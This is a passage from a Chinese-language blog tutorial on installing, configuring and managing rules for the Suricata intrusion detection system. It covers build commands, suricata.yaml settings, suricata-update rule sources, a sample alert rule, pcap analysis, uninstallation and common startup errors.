spellcheck="true"># ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-nfqueue --enable-lua</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603262683253.png" alt="1603262683253"></p><p>之后再编译安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sudo make install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603878275030.png" alt="1603878275030"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sudo ldconfig</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后进行一些配置：</p><p>（1）自动为您创建/设置所有必需的目录和suricata.yaml：</p><pre><code>[root@m01ly suricata-6.0.0]#make install-conf</code></pre><p>（2） 自动配置规则集</p><pre><code>[root@m01ly suricata-6.0.0]#make install-rules</code></pre><p>将执行常规的“ make install”，然后它将自动从Suricata的“ Emerging Threats ”中下载并设置最新规则集</p><p>（3）将结合上述所有内容（install-conf和install-rules）-并为您提供可以运行（配置和设置）的Suricata</p><pre><code>[root@m01ly suricata-6.0.0]#make install-full</code></pre><p>安装完成后，安装目录为：/etc/suricata，配置文件为/etc/suricata/suricata.yaml</p><h1 id="二-基础配置"><a href="#二-基础配置" class="headerlink" title="二 基础配置"></a>二 基础配置</h1><p>按照<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Basic_Setup">官方基础配置</a>一步步就可。注意图中的cp指令一块不需要操作，6.0版本自动会复制。<img src="/2020/09/11/install-guide-suricata/1603693471544.png" alt="1603693471544"></p><p>(1) 创建目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> /var/log/suricata<span class="token function">sudo</span> <span class="token function">mkdir</span> /etc/suricata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>[root@ids0001 suricata-5.0.0]# cd etc[root@ids0001 etc]# lsclassification.config  Makefile.am  reference.config    suricata.logrotate.in  suricata.service.inMakefile               Makefile.in  suricata.logrotate  suricata.service[root@ids0001 etc]# sudo cp classification.config /etc/suricata[root@ids0001 etc]# sudo cp reference.config /etc/suricata</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603855808097.png" alt="1603855808097"></p><pre><code>./configure &amp;&amp; make &amp;&amp; make install-conf</code></pre><p>需要一段时间，最后结果：</p><p><img src="/2020/09/11/install-guide-suricata/1603878960614.png" alt="1603878960614"></p><p>自动下载和设置从正在出现的威胁可Suricata最新的规则集。</p><p>./configure &amp;&amp; make &amp;&amp; make install-rules</p><p>需要又一段时间，最后结果：</p><p>./configure &amp;&amp; make &amp;&amp; make install-full</p><h2 id="2-1-基础配置"><a href="#2-1-基础配置" class="headerlink" title="2.1 基础配置"></a>2.1 基础配置</h2><p> 配置文件位于**/etc/suricata/suricata.yaml**。用VIM打开</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /etc/suricata/</span><span class="token punctuation">[</span>root@m01ly suricata<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim suricata.yaml</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（1）配置要拦截的流量设置</p><p> 在“vars”部分下，您将找到Suricata使用的几个重要变量。</p><p>“HOME_NET”应指向Suricata要检查的本地网络。</p><p>“！$ HOME_NET”（分配给EXTERNAL_NET）是指除本地网络之外的任何其他网络。</p><p>“XXX_PORTS”表示不同服务使用的端口号。请注意，无论使用何种端口，Suricata都可以自动检测HTTP流量。因此，正确指定HTTP_PORTS变量并不重要。</p><p>先设置HOME_NET与EXTERNAL_NET，推荐HOME_NET填写内网网段，EXTERNAL_NET设置为any</p><p>注意如果HOME_NET设置了any，EXTERNAL_NET设置！HOME_NET的话会报错，如果HOME_NET设置了内网地址，EXTERNAL_NET设置为！$HOME_NET的话，有些内网之间的告警就无法匹配到 </p><p><img src="/2020/09/11/install-guide-suricata/1603708931016.png" alt="1603708931016"></p><p>（2）指定日志文件目录</p><p><img src="/2020/09/11/install-guide-suricata/1603708864025.png" alt="1603708864025"></p><p>（3） host-os-policy 配置，在文件百分之60处。</p><p> “host-os-policy”部分用于防御一些众所周知的攻击，这些攻击利用操作系统的网络堆栈（例如，TCP重组）的行为来逃避检测。作为对策，现代IDS提出了所谓的“基于目标”的检查，其中检查引擎基于流量的目标操作系统微调其检测算法。因此，如果您知道正在运行的OS个别本地主机，您可以将该信息提供给Suricata以提高其检测率。 </p><p><img src="/2020/09/11/install-guide-suricata/1603709095833.png" alt="1603709095833"></p><p>（4）线程</p><p>在“线程”部分下，您可以为不同的Suricata线程指定CPU关联。默认情况下，禁用CPU关联（“set-cpu-affinity：no”），这意味着将在任何可用的CPU核心上调度Suricata线程。默认情况下，Suricata将为每个CPU核心创建一个“检测”线程。您可以通过指定“detect-thread-ratio：N”来调整此行为。这将创建N * M个检测线程，其中M是主机上CPU核心的总数。</p><p>使用上述线程设置，Suricata将创建1.5 * M检测线程，其中M是系统上CPU核心的总数。</p><h2 id="2-2-启动"><a href="#2-2-启动" class="headerlink" title="2.2 启动"></a>2.2 启动</h2><h3 id="2-2-1-关闭-LRO-GRO"><a href="#2-2-1-关闭-LRO-GRO" class="headerlink" title="2.2.1 关闭 LRO / GRO"></a>2.2.1 关闭 LRO / GRO</h3><p>当您使用<code>pcap</code>捕获模式时，强烈建议关闭Suricata正在侦听的NIC上的任何数据包offloead功能（例如，LRO / GRO），因为这些功能可能会干扰实时数据包捕获。</p><p>以下是如何在网络接口eth0上关闭LRO / GRO：</p><pre><code>[root@m01ly ~]# sudo ethtool -K ens33 gro off lro off</code></pre><h3 id="2-2-2-测试是否配置成功："><a href="#2-2-2-测试是否配置成功：" class="headerlink" title="2.2.2 测试是否配置成功："></a>2.2.2 测试是否配置成功：</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># suricata -T</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603697120852.png" alt="1603697120852"></p><h3 id="2-2-3-运行模式"><a href="#2-2-3-运行模式" class="headerlink" title="2.2.3  运行模式"></a>2.2.3  运行模式</h3><p>Suricata支持多种运行模式。运行模式确定不同线程如何用于IDS。以下命令列出了所有<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Runmodes">可用的runmodes</a>。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo /usr/local/bin/suricata --list-runmodes</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> Suricata使用的默认运行模式是<code>autofp</code>（代表“自动流固定负载平衡”）。在此模式下，来自每个不同流的数据包将分配给单个检测线程。将流分配给具有最少数量的未处理数据包的线程。 </p><h3 id="2-2-4-启动suricata"><a href="#2-2-4-启动suricata" class="headerlink" title="2.2.4 启动suricata"></a>2.2.4 启动suricata</h3><p>启动命令：sudo suricata -c 启动文件 -i 网卡名称 –init-errors-fatal：例如下面</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@suricata ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml    -i ens33   -s /etc/suricata/rules/test.rules</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603709547401.png" alt="1603709547401"></p><p>后台启用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo nohup /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal &amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-2-5-查看日志"><a href="#2-2-5-查看日志" class="headerlink" title="2.2.5 查看日志"></a>2.2.5 查看日志</h3><p>Suricata检测日志存储在/ var / log / suricata目录中。</p><p>其中fast.log表示命中规则的日志。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -f /var/log/suricata/fast.log</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603713977753.png" alt="1603713977753"></p><p>为了便于导入，日志也以json格式提供：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -f /var/log/suricata/eve.json</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603714049656.png" alt="1603714049656"></p><h1 id="三-规则管理"><a href="#三-规则管理" class="headerlink" title="三 规则管理"></a>三 规则管理</h1><h2 id="3-1-规则介绍"><a href="#3-1-规则介绍" class="headerlink" title="3.1 规则介绍"></a>3.1 规则介绍</h2><h3 id="3-1-1-规则集"><a href="#3-1-1-规则集" class="headerlink" title="3.1.1 规则集"></a>3.1.1 规则集</h3><p>suricata系统自带的规则主要是et/open 规则，目前开源免费的就是et/open、pt规则、sslbl规则，其余的需要授权码才能更新，如下：</p><ol><li><a href="https://github.com/jasonish/suricata-trafficid/blob/master/rules/traffic-id.rules">Suricata作者写的一个规则生成的脚本</a>：生成用于应用和服务识别的规则。</li><li><a href="https://sslbl.abuse.ch/blacklist/sslblacklist.rule">瑞士的非盈利组织abuse.ch维护的项目</a>：他们维护的这个黑名单是标识恶意软件与僵尸网络相关的，列表里面提供了有关恶意软件与僵尸网络的ssl证书列表，根据证书特征来匹配流量中的威胁。他们提供了一个Suricata的规则，可以根据黑名单检测网络中的恶意连接。</li><li><a href="https://github.com/ptresearch/AttackDetection">PT的Suricata规则库</a>：根据恶意软件、黑客的网络通讯协议以及漏洞的poc去编写，里面包含了近几年常见cve漏洞的检测，更新十分及时。</li><li><a href="https://rules.emergingthreats.net/open/suricata/rules/">Emerging Threats维护的规则</a>：这个就比较熟悉了，我们一般常用的就是这个规则库。很强大的规则库，规则数量有20000+ 。<a href="http://doc.emergingthreats.net/bin/view/Main/EmergingFAQ#What_is_the_general_intent_of_ea">官方规则解释</a></li></ol><h3 id="3-1-2-规则管理工具"><a href="#3-1-2-规则管理工具" class="headerlink" title="3.1.2 规则管理工具"></a>3.1.2 规则管理工具</h3><p>规则管理，就是便于对suricata的规则进行统一的管理，比如更新、启用、停用等。相关的规则管理工具有很多，简单列举几个：   </p><ul><li><a href="https://github.com/jasonish/suricata-update">Suricata-Update</a> ：常用工具</li><li><a href="https://github.com/StamusNetworks/scirius">Scirius</a>：Scirius是个管理Suricata规则集的Web应用。搭建和使用也不难，参见github。</li><li><a href="https://www.jianshu.com/p/1a96770695db">Oinkmaster</a></li><li><a href="https://github.com/shirkdog/pulledpork">Pulledpork：</a></li></ul><h2 id="3-2-规则更新"><a href="#3-2-规则更新" class="headerlink" title="3.2 规则更新"></a>3.2 规则更新</h2><p>suricata规则更新可以使用suricata-update来进行更新, 输入suricata-update 会自动进行规则更新，显示当前已经更新与启用了多少规则 </p><h3 id="3-2-1-更新规则库"><a href="#3-2-1-更新规则库" class="headerlink" title="3.2.1 更新规则库"></a>3.2.1 更新规则库</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 最近的一次更新结果如下，规则总数为28178条： </p><p><img src="/2020/09/11/install-guide-suricata/1603697024470.png" alt="1603697024470"></p><p>规则更新后，所有的规则都会保存在/var/lib/suricata/rules/suricata.rules这一个文件中，这个时候就必须修改suricata配置文件suricata.yaml的default-rule-path与rule-files来指定规则文件到这个规则上:</p><pre class="line-numbers language-bash"><code class="language-bash">default-rule-path: /var/lib/suricata/rulesrule-files:  - suricata.rules<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-更新规则源"><a href="#3-2-2-更新规则源" class="headerlink" title="3.2.2 更新规则源"></a>3.2.2 更新规则源</h3><p>（1）更新规则源：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update update-sources</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700557845.png" alt="1603700557845"></p><p>（2）列出更新源列表 suricata-update list-sources </p><p><img src="/2020/09/11/install-guide-suricata/1603697274919.png" alt="1603697274919"></p><p>每个规则集都有一个前缀为“vendor”的名称，后跟一个集名称。例如，iosf的traffic id规则集称为“iosf/trafficid”。</p><h3 id="3-2-3-启用某个规则集"><a href="#3-2-3-启用某个规则集" class="headerlink" title="3.2.3 启用某个规则集"></a>3.2.3 启用某个规则集</h3><p>要启用ptresearch/attackdetection的规则集：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update enable-source ptresearch/attackdetection</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700718529.png" alt="1603700718529"></p><h3 id="3-2-4-禁用规则"><a href="#3-2-4-禁用规则" class="headerlink" title="3.2.4 禁用规则"></a>3.2.4 禁用规则</h3><p>使用Suricata-update更新规则时，默认是将所有规则合并在一个规则文件中：/var/lib/suricata/rules/suricata.rules。</p><p><img src="/2020/09/11/install-guide-suricata/1603705089676.png" alt="1603705089676"></p><p>Suricata-update有个 –no-merge参数，使用这个参数更新规则，规则不会进行合并，是以独立的文件存在于文件夹下。但是在管理规则的时候很不方便，必须要自己管理Suricata引入的规则。但是在禁用规则的时候，也可以使用suricata-update去配置disable.conf禁用的规则。不推荐使用 –no-merge参数更新规则。指定一个文件让suricata-update合并输出会更简单。在suricata.yaml中修改default-rule-path和rule-files。</p><p><img src="/2020/09/11/install-guide-suricata/1603708490301.png" alt="1603708490301"></p><p>通过suricata-udpate可以很好的控制规则，例如要禁用某一个规则，直接新建/etc/suricata/disable.conf 文件，然后在里面填入sid，每次更新的话会自动禁止该规则 </p><p>默认情况下 <code>suricata-update</code> 将所有规则合并到一个文件“/var/lib/suricata/rules”/苏里克塔规则”.</p><p>要启用默认禁用的规则，请使用 /etc/suricata/enable.conf</p><pre><code>2019401                   # enable signature with this sidgroup:emerging-icmp.rules # enable this rulefilere:trojan                 # enable all rules with this string</code></pre><p>类似地，要禁用规则，请使用 /etc/suricata/disable.conf ：</p><pre class="line-numbers language-bash"><code class="language-bash">2019401                   <span class="token comment" spellcheck="true"># disable signature with this sid</span>group:emerging-info.rules <span class="token comment" spellcheck="true"># disable this rulefile</span>re:heartbleed             <span class="token comment" spellcheck="true"># disable all rules with this string</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>更新这些文件后，</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update --disable-conf /etc/suricata/disable.conf</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新运行 <code>suricata-update</code> 再一次：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sudo suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后重新开始测量。</p><h2 id="3-5-规则源的CRUD"><a href="#3-5-规则源的CRUD" class="headerlink" title="3.5 规则源的CRUD"></a>3.5 规则源的CRUD</h2><h3 id="3-5-1-列出我们使用的规则源"><a href="#3-5-1-列出我们使用的规则源" class="headerlink" title="3.5.1 列出我们使用的规则源"></a>3.5.1 列出我们使用的规则源</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># suricata-update list-enabled-sources</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603701147686.png" alt="1603701147686"></p><h3 id="3-5-2-更新规则源"><a href="#3-5-2-更新规则源" class="headerlink" title="3.5.2 更新规则源"></a>3.5.2 更新规则源</h3><pre><code>[root@m01ly ~]#suricata-update update-sources</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700557845.png" alt="1603700557845"></p><h3 id="3-5-3-删除某个规则源"><a href="#3-5-3-删除某个规则源" class="headerlink" title="3.5.3 删除某个规则源"></a>3.5.3 删除某个规则源</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update remove-source et/pro</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-5-4-启动某个规则源"><a href="#3-5-4-启动某个规则源" class="headerlink" title="3.5.4 启动某个规则源"></a>3.5.4 启动某个规则源</h3><p>启用ptresearch/attackdetection的规则集：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update enable-source ptresearch/attackdetection</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700718529.png" alt="1603700718529"></p><h2 id="3-6-规则的CRUD"><a href="#3-6-规则的CRUD" class="headerlink" title="3.6 规则的CRUD"></a>3.6 规则的CRUD</h2><p> <a href="https://suricata-update.readthedocs.io/en/latest/update.html#rule-matching">https://suricata-update.readthedocs.io/en/latest/update.html#rule-matching</a> </p><h1 id="4-一个实例"><a href="#4-一个实例" class="headerlink" title="4 一个实例"></a>4 一个实例</h1><p>/var/lib/suricata/rules/下创建一个test.rules,内容为：</p><pre class="line-numbers language-bash"><code class="language-bash">alert http any any -<span class="token operator">></span> any any <span class="token punctuation">(</span>msg:<span class="token string">"hit baidu.com..."</span><span class="token punctuation">;</span>content:<span class="token string">"baidu"</span><span class="token punctuation">;</span> reference:url, www.baidu.com<span class="token punctuation">;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改配置文件/etc/suricata/suricata.yaml，再规则下添test.rules</p><pre><code>#启动suricata#sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml    -i eth0</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603858949410.png" alt="1603858949410"></p><h1 id="5-suricata-分析包功能"><a href="#5-suricata-分析包功能" class="headerlink" title="5 suricata 分析包功能"></a>5 suricata 分析包功能</h1><p> 分析单个包：suricata -r pcap文件名 -l 自定义输出位置</p><p> 分析文件夹里所以的包：suricata -r pcap文件夹名 -l 自定义输出位置 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/test.cap -l  /var/log/suricata/cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603955429308.png" alt="1603955429308"></p><p><img src="/2020/09/11/install-guide-suricata/1603955464136.png" alt="1603955464136"></p><h1 id="6-卸载suricata"><a href="#6-卸载suricata" class="headerlink" title="6 卸载suricata"></a>6 卸载suricata</h1><pre><code>[root@ids0001 ~]# find / -name suricata /run/suricata/etc/suricata/root/suricata-5.0.0/python/suricata/root/suricata-5.0.0/suricata-update/suricata/var/lib/suricata/var/log/suricata/usr/bin/suricata/usr/lib/python2.7/site-packages/suricata/usr/share/doc/suricata/usr/share/suricata/usr/share/kibana/x-pack/plugins/siem/public/components/timeline/body/renderers/suricata/usr/local/bin/suricata/usr/local/etc/suricata/usr/local/lib/python2.7/site-packages/suricata/usr/local/share/suricata/usr/local/share/doc/suricata/usr/local/var/log/suricata/usr/local/var/run/suricata/usr/local/var/lib/suricata/home/supper-user/suricata-5.0.0/src/suricata/home/supper-user/suricata-5.0.0/src/.libs/suricata/home/supper-user/suricata-5.0.0/python/suricata/home/supper-user/suricata-5.0.0/python/lib/suricata/home/supper-user/suricata-5.0.0/suricata-update/suricata/home/supper-user/suricata-5.0.0/suricata-update/lib/suricata</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603877103161.png" alt="1603877103161"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> -rf /run/suricata \/etc/suricata \/root/suricata-5.0.0/python/suricata \/root/suricata-5.0.0/suricata-update/suricata \/var/lib/suricata \/var/log/suricata \/usr/bin/suricata \/usr/lib/python2.7/site-packages/suricata \/usr/share/doc/suricata \/usr/share/suricata \/usr/share/kibana/x-pack/plugins/siem/public/components/timeline/body/renderers/suricata \/usr/local/bin/suricata \/usr/local/etc/suricata \/usr/local/lib/python2.7/site-packages/suricata \/usr/local/share/suricata \/usr/local/share/doc/suricata \/usr/local/var/log/suricata \/usr/local/var/run/suricata \/usr/local/var/lib/suricata \/home/supper-user/suricata-5.0.0/src/suricata \/home/supper-user/suricata-5.0.0/src/.libs/suricata \/home/supper-user/suricata-5.0.0/python/suricata \/home/supper-user/suricata-5.0.0/python/lib/suricata \/home/supper-user/suricata-5.0.0/suricata-update/suricata \/home/supper-user/suricata-5.0.0/suricata-update/lib/suricata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="7-error"><a href="#7-error" class="headerlink" title="7 error"></a>7 error</h1><p>错误1 eth0网卡不存在</p><p><img src="/2020/09/11/install-guide-suricata/1603876350581.png" alt="1603876350581"></p><pre class="line-numbers language-bash"><code class="language-bash">9:25 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_INVALID_ARGUMENT<span class="token punctuation">(</span>13<span class="token punctuation">)</span><span class="token punctuation">]</span> - eve-log dns version not found, forcing it to version 228/10/2020 -- 09:09:25 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_INVALID_ARGUMENT<span class="token punctuation">(</span>13<span class="token punctuation">)</span><span class="token punctuation">]</span> - eve-log dns version not found, forcing it to version 228/10/2020 -- 09:09:33 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_SYSCALL<span class="token punctuation">(</span>50<span class="token punctuation">)</span><span class="token punctuation">]</span> - Failure when trying to <span class="token keyword">set</span> feature via ioctl <span class="token keyword">for</span> <span class="token string">'eth0'</span><span class="token keyword">:</span> Operation not supported <span class="token punctuation">(</span>95<span class="token punctuation">)</span>28/10/2020 -- 09:09:33 - <span class="token operator">&lt;</span>Notice<span class="token operator">></span> - all 2 packet processing threads, 4 management threads initialized, engine started.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>错误2  内存不够</p><p><img src="/2020/09/11/install-guide-suricata/1604628379983.png" alt="1604628379983"></p><pre class="line-numbers language-bash"><code class="language-bash">root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># suricata -T6/11/2020 -- 02:05:11 - &lt;Info> - Running suricata under test mode6/11/2020 -- 02:05:11 - &lt;Notice> - This is Suricata version 6.0.0 RELEASE running in SYSTEM mode6/11/2020 -- 02:05:21 - &lt;Error> - [ERRCODE: SC_ERR_MEM_ALLOC(1)] - SCRealloc failed: Cannot allocate memory, while trying to allocate 67108864 bytes6/11/2020 -- 02:05:22 - &lt;Error> - [ERRCODE: SC_ERR_FATAL(171)] - Out of memory. The engine cannot be initialized.Exiting...</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启解决</p><p>问题三：内存不够 </p><p><img src="/2020/09/11/install-guide-suricata/1604629087216.png" alt="1604629087216"></p><pre class="line-numbers language-bash"><code class="language-bash">6/11/2020 -- 02:16:45 - <span class="token operator">&lt;</span>Notice<span class="token operator">></span> - This is Suricata version 6.0.0 RELEASE running <span class="token keyword">in</span> SYSTEM mode6/11/2020 -- 02:16:54 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_SYSCALL<span class="token punctuation">(</span>50<span class="token punctuation">)</span><span class="token punctuation">]</span> - Failure when trying to <span class="token keyword">set</span> feature via ioctl <span class="token keyword">for</span> <span class="token string">'eth0'</span><span class="token keyword">:</span> Operation not supported <span class="token punctuation">(</span>95<span class="token punctuation">)</span>6/11/2020 -- 02:16:54 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_INITIALIZATION<span class="token punctuation">(</span>45<span class="token punctuation">)</span><span class="token punctuation">]</span> - Unix socket: UNIX socket bind<span class="token punctuation">(</span>/usr/local/var/run/suricata/suricata-command.socket<span class="token punctuation">)</span> error: No space left on device6/11/2020 -- 02:16:54 - <span class="token operator">&lt;</span>Error<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_FATAL<span class="token punctuation">(</span>171<span class="token punctuation">)</span><span class="token punctuation">]</span> - Unable to create unix <span class="token function">command</span> socket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>8所有命令</p><pre><code>1.安装必要库(1)检查是否安装了jansson,这是Suricata输出的日志文件eve.json必备库可参考:彻底解决Suricata Eve-log support not compiled in 问题(2)安装pfring2.安装Suricatahttps://suricata-ids.org/download/下载安装包(1)解压安装包tar -zxf suricata-4.1.0.tar.gz(2)编译和安装./configure -enable-pfring --with-libpfring-includes=/opt/pfring/include --with-libpfring-libraries=/opt/pfring/lib -with-libjansson libraries=/usr/lib64/ --with-libjansson-includes=/usr/includemakemake install(3)创建必要的目录，这些目录都是suricata.yaml配置文件中写好的路径，但不会主动创建，需要手动创建mkdir /usr/local/etc/suricata/ #配置文件目录cp suricata-4.1.0/classification.config /usr/local/etc/suricata/cp suricata-4.1.0/reference.config /usr/local/etc/suricata/cp suricata-4.1.0/suricata.yaml /usr/local/etc/suricata/cp suricata-4.1.0/threshold.config /usr/local/etc/suricata/mkdir /usr/local/var/run/suricatamkdir /usr/local/var/log/suricata/ #suricata默认日志输出位置(4)离线安装规则在https://rules.emergingthreats.net/open/,中下载emerging.rules.tar.gztar -zxf emerging.rules.tar.gzrm -rf /usr/local/share/suricata/rulesmv rules /usr/local/share/suricata/(5)运行suricata/usr/local/bin/suricata --pfring-int=em1 --pfring-cluster-id=99 --pfring-cluster-type=cluster_flow -c /usr/local/etc/suricata/suricata.yaml -D(6)输出的日志的类型可以在suricata.yaml中进行设置</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/d81db4c352af">Suricata默认规则集的目的与用途</a>   nice</p><p><a href="https://suricata-update.readthedocs.io/en/latest/">suricata-update的官方文档：</a>   规则工具的官网文档 <a href="https://www.osgeo.cn/suricata/rule-management/suricata-update.html">https://www.osgeo.cn/suricata/rule-management/suricata-update.html</a> </p><p><a href="https://zhuanlan.zhihu.com/p/36340468">Suricata规则介绍、以及使用suricata-update做规则管理</a> </p><p><a href="https://zhuanlan.zhihu.com/p/37173608">Suricata IDS 入门 — 规则详解</a>  比较详细</p><p><a href="https://suricata.readthedocs.io/en/suricata-6.0.0/">suricata官方6.0 文档</a> </p><p><a href="https://suricata-update.readthedocs.io/en/latest/update.html#rule-matching">规则的CRUD</a></p><p><a href="http://www.hyuuhit.com/2018/02/11/suricata-config/">suricata命令行参数</a></p><p><a href="https://www.osgeo.cn/suricata/command-line-options.html">suricata命令行参数2</a></p><p><a href="https://www.yuque.com/dekeshile/pkiul1/rrlufv">suricata笔记</a> 不错，较全面</p><p><a href="https://www.yuque.com/dekeshile/pkiul1/rrlufv">suricata较完整的功能列表</a> 后续继续学习</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/install-guide-suricata/#disqus_thread</comments>
      
